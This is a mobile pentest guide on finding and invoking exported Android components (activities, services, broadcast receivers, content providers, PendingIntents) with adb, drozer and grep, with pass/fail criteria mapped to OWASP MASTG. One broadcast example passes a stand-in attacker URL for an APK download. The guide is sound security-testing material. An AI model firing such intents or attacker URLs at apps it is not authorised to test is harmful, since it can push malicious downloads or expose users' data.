---
author: Kayra
pubDatetime: 2026-09-27T00:00:00+03:00
title: "Exported Components and the IPC Attack Surface"
slug: "android-exported-components"
category: notes
format: guide
handbook: mobile
tags: ["android"]
draft: false
featured: false
description: "How to test an Android app's exported components: enumerate activities, services, broadcast receivers, and content providers from the manifest, then invoke each one with am or drozer and judge whether the functionality behind it should be reachable from outside."
---

An exported component is one any other app on the device can reach without holding a permission the app controls. Activities, services, broadcast receivers, and content providers can each be exported, and an exported component that performs a sensitive action without checking who is calling it is a finding. This page covers how to map that surface and test each component type; the component model and the intent system behind it are in [Android Foundations](/collections/mobile/android-foundations).

## Enumerating the Exported Surface

The manifest is the map. Decompile the APK with [apktool](/collections/mobile/apktool) or [jadx](/collections/mobile/jadx), then list every component declaration with its export and permission attributes:

```bash
grep -nE '<activity|<service|<receiver|<provider|android:exported|android:permission' apktool_out/AndroidManifest.xml
```

For an app already installed on a device, `dumpsys package` prints its exported components at runtime; the command is in [Android ADB](/collections/mobile/android-adb).

## What Makes a Component Exported

- **`android:exported="true"`**: the component is reachable by any app.
- **An intent filter without `android:exported`**: before Android 12, activities, services, and broadcast receivers with an intent filter were exported implicitly. From Android 12 (API 31) every one of them must declare `android:exported` explicitly, or the app does not install.
- **No intent filter and no `android:exported`**: the component is not exported.
- **`android:permission`**: callers must hold this permission. The protection level decides who can hold it. `normal` is granted to any app that requests it, `dangerous` needs runtime user consent, `signature` only apps signed with the same key, and `signatureOrSystem` adds apps on the system image. `signature` is the only one that meaningfully restricts external callers.

An exported component with no `android:permission` is the case to chase: any app can invoke it, so whatever it does is reachable from outside.

## Invoking Components

`am` reaches every component from adb. The full reference is in [Android ADB](/collections/mobile/android-adb); the canonical form for each type:

```bash
# Activity
adb shell am start -n com.example.app/.SensitiveActivity

# Service
adb shell am startservice -n com.example.app/.SensitiveService
adb shell am start-foreground-service -n com.example.app/.SensitiveService

# Broadcast receiver, by action (implicit) or by component (explicit)
adb shell am broadcast -a com.example.app.ACTION --es key value
adb shell am broadcast -n com.example.app/.SensitiveReceiver -a com.example.app.ACTION

# Content provider
adb shell content query --uri content://com.example.app.provider/items
```

Extras are typed: `--es` for string, `--ei` for int, `--ez` for boolean. Since Android 8, background execution limits stop an app in the background from starting a service; adb's shell is exempt, so `am startservice` from adb still works.

`drozer` is an Android security-testing framework: an agent app you install on the device plus a console that runs commands on it, so Android applies the same checks it would for any attacker app, the caller a component actually sees. It also automates the sending:

```text
run app.package.attacksurface com.example.app
run app.broadcast.send --component com.example.app com.example.app/.SensitiveReceiver --action com.example.app.ACTION
```

## Activities

An exported activity can be launched directly, skipping whatever the launcher shows first. The question for each one is whether it reaches functionality the user should authorize first, or trusts data carried in the intent. This is MASTG-TEST-0364.

```bash
adb shell am start -n com.example.app/.AdminPanelActivity
```

Read the activity's `onCreate` for how it consumes `getIntent()` extras and whether it checks the caller before showing sensitive state.

- **Pass**: exported activities expose only harmless entry points, and any that show sensitive data check the caller.
- **Fail**: an exported activity shows accounts, credentials, or admin functions, or uses intent extras without validating them.
- **Evidence**: the activity declaration with its export and permission attributes, the code that consumes the intent, and the `am start` command.

## Services

An exported service can be started or bound. `am startservice` drives the start path; a bound service returns a `Binder` the caller invokes, which `am` cannot drive, so test bound services with drozer or a small client app. This is MASTG-TEST-0365.

```bash
adb shell am startservice -n com.example.app/.ExportService
```

Watch whether starting it kicks off sensitive work: a download, an upload, a credential reset, a file operation.

- **Pass**: exported services do no sensitive work on start, or are guarded by a signature permission.
- **Fail**: starting an exported service from outside triggers a sensitive action.
- **Evidence**: the service declaration, the code in `onStartCommand` or `onBind`, and the `am startservice` command.

## Broadcast Receivers

A receiver runs its `onReceive` whenever a matching broadcast arrives. An exported receiver accepts broadcasts from any app, so the question is what `onReceive` does with them. This is MASTG-TEST-0366, the exposed-receiver check.

Static pass: list every `<receiver>` with its intent filter and its export and permission attributes, then read each exported receiver's `onReceive` in the decompiled code. A receiver that starts an activity or service with extras from the intent, triggers a download, resets state, or sends data back is the finding. A receiver that only reads a system broadcast such as boot completed or a connectivity change for internal bookkeeping usually is not.

Dynamic receivers, registered in code with `registerReceiver` rather than the manifest, are part of the same surface. From Android 13 (API 33) a dynamic receiver with an implicit filter must declare `RECEIVER_EXPORTED` or `RECEIVER_NOT_EXPORTED`; `RECEIVER_EXPORTED` means other apps can send to it.

```bash
grep -rn "registerReceiver\|RECEIVER_EXPORTED\|RECEIVER_NOT_EXPORTED" jadx_out/sources/
```

Dynamic pass: send each exported receiver the actions its filter declares, with plausible extras, and watch what the app does. Clear `logcat`, send, then read the log to see whether the receiver fired:

```bash
adb logcat -c
adb shell am broadcast -n com.example.app/.SensitiveReceiver -a com.example.app.ACTION --es url "http://attacker/file.apk"
adb logcat -d | grep -i com.example.app
```

If the receiver starts a download or an activity on receipt, that is the proof.

- **Pass**: exported receivers perform no sensitive action, and dynamic receivers are registered `RECEIVER_NOT_EXPORTED` or only match app-internal actions.
- **Fail**: an exported receiver (manifest or dynamic) runs a sensitive action on a broadcast any app can send, or trusts extras from the intent.
- **Evidence**: the receiver declaration with its export and permission attributes, the `onReceive` code, and the `am broadcast` command that triggered the behavior.

## Content Providers

A provider that serves stored data is covered by the storage checks; this section treats the provider as a reachable component. Provider defaults have changed across Android versions, so read the explicit `android:exported` attribute rather than assuming one. Check `android:readPermission` and `android:writePermission` and `android:grantUriPermissions`, then query the exposed authorities:

```bash
adb shell content query --uri content://com.example.app.provider/items
```

- **Pass**: exported providers require a permission or grant URI access per use.
- **Fail**: an exported provider serves data with no permission, or grants URI access too broadly.
- **Evidence**: the provider declaration and the `content query` that returned data.

## Deep Links

An exported activity with a `VIEW` intent filter and a scheme is a deep link, and it is part of the same surface: another app or a browser fires the URI and the handler trusts it. The full technique, including how App Links verify ownership, is in [Deep Links and URL Schemes on Android](/collections/mobile/android-deep-links).

## PendingIntent

A `PendingIntent` passes a future intent to another app or to the system, and it runs with the creating app's identity and permissions. The failure is a mutable `PendingIntent` wrapping an implicit intent: another app can replace the base intent with its own and get the delegated action executed with the app's privileges. `FLAG_IMMUTABLE` is the safe default. This is MASTG-TEST-0381.

```bash
grep -rnE 'PendingIntent\.(getActivity|getService|getBroadcast)|FLAG_MUTABLE|FLAG_IMMUTABLE' jadx_out/sources/
```

- **Pass**: PendingIntents are `FLAG_IMMUTABLE`, or where mutability is required the base intent is explicit.
- **Fail**: a mutable PendingIntent wraps an implicit intent.
- **Evidence**: the PendingIntent creation call and the base intent it wraps.

These checks sit under MASVS-PLATFORM-1, the control for how an app uses IPC; the MASVS system and the testing profiles that set the bar are in [The OWASP MAS Project](/collections/mobile/mas-project).